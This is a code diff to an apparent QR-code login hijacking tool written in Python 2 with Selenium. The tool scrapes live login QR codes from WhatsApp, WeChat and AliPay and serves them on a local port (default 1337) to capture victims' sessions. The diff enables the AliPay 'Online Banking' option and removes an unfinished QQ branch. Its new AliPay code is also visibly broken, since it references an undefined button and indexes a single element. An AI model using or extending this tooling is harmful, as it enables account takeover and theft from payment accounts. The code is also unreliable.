@@ -102,7 +102,7 @@ def whatsapp():
 		try:
 			button = driver.find_element_by_class_name('qr-button')
 			print " [!]Clicking to reload QR code image..."
-			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
+			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
 			time.sleep(5)
 		except:
 			pass
@@ -225,17 +225,26 @@ def WeChat():
 		except:
 			break
 
-def QQ():
+def AliPay():
 	driver = create_driver()
 	time.sleep(5)
 	print " [+]Navigating To Website.."
-	driver.get("http://w.qq.com")
+	driver.get("https://auth.alipay.com/login/index.htm")
 	time.sleep(10)
 	while True:
 		print "-- --- -- --- -- --- -- --- -- --- --"
 		try:
+			c = driver.find_element_by_class_name('ui-nav')[0]
+			t = c.find_elements_by_tag_name("li")[0]
+			print " [!]Clicking to show QR code image..."
+			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
+			time.sleep(5)
+		except:
+			pass
+
+		try:
 			driver.save_screenshot('tmp.png') #screenshot entire page
-			img = driver.find_elements_by_tag_name("img")[0]
+			img = driver.find_elements_by_tag_name("canvas")[0]
 			print " [+]The QR code image found !"
 			location = img.location
 			size = img.size
@@ -504,21 +513,8 @@ def main():
 			Weibo()
 			main()
 
-		#not finished yet
-		elif int(choice_2) == 5:
-			port = raw_input(" Port to listen on (Default 1337) : ")
-			try:
-				int(port)
-			except ValueError:
-				port = 1337
+		#QQ
 
-			if port == "":
-				port = 1337
-			clear()
-			make()
-			Serve_it(port)
-			QQ()
-			main()
 
 	#Mailing Services
 	if choice == 2:
@@ -604,13 +600,28 @@ def main():
 	#Online Banking
 	if choice == 4:
 		print """
- 1.AliPay [Soon]
+ 1.AliPay
  2.Yandex Money
  3.TenPay [Soon]
  00.Back To Main Menu
 	"""
 		choice_2 = raw_input(" Second Choice > ")
 		if choice_2 == "00":
+			main()
+
+		elif int(choice_2) == 1:
+			port = raw_input(" Port to listen on (Default 1337) : ")
+			try:
+				int(port)
+			except ValueError:
+				port = 1337
+
+			if port == "":
+				port = 1337
+			clear()
+			make()
+			Serve_it(port)
+			AliPay()
 			main()
 
 		elif int(choice_2) == 2:
